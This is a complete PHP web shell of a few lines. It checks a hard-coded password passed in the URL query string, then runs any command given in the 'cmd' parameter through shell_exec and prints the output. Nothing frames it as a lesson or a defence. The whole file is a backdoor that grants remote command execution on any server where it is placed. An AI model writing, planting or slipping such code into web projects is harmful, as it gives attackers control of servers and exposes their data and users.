<pre><?php
  if(isset($_GET['pwd']) && ($_GET['pwd'] == "thesecretpassword") && isset($_GET['cmd']) && !empty($_GET['cmd'])){
    echo shell_exec($_GET['cmd']);
  }
?>